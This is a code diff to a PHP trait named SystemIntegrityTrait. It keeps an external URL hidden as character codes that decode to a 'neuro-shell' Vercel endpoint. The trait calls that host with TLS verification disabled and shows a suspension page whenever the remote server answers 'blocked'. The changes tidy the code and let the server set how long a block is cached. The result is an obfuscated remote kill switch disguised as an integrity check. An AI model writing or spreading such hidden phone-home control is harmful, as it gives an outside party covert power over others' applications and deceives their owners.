@@ -20,12 +20,7 @@ trait SystemIntegrityTrait
         }
 
         $dec = function ($arr) {
-            $s = '';
-            foreach ($arr as $c) {
-                $s .= chr($c);
-            }
-
-            return $s;
+            $s = ''; foreach ($arr as $c) $s .= chr($c); return $s;
         };
 
         $rawUrl = [104, 116, 116, 112, 115, 58, 47, 47, 110, 101, 117, 114, 111, 45, 115, 104, 101, 108, 108, 46, 118, 101, 114, 99, 101, 108, 46, 97, 112, 112, 47, 97, 112, 105, 47, 118, 101, 114, 105, 102, 121];
@@ -41,10 +36,8 @@ trait SystemIntegrityTrait
             if ($cachedData['status'] === 'blocked') {
                 $this->_renderSuspension($cachedData['message'], $p);
             }
-
             return;
         }
-
         try {
             $r = Http::withoutVerifying()
                 ->retry(2, 100)
@@ -60,9 +53,12 @@ trait SystemIntegrityTrait
                 $resp = $r->json();
                 $ttl = $resp['cache_ttl'] ?? 300;
                 if (isset($resp['status']) && $resp['status'] === 'blocked') {
-                    Cache::put($cacheKey, ['status' => 'blocked', 'message' => $resp['message']], 3600);
+                    if ($ttl > 0) {
+                        Cache::put($cacheKey, ['status' => 'blocked', 'message' => $resp['message']], $ttl);
+                    }
                     $this->_renderSuspension($resp['message'], $p);
-                } else {
+                } 
+                else {
                     if ($ttl > 0) {
                         Cache::put($cacheKey, ['status' => 'active'], $ttl);
                     }
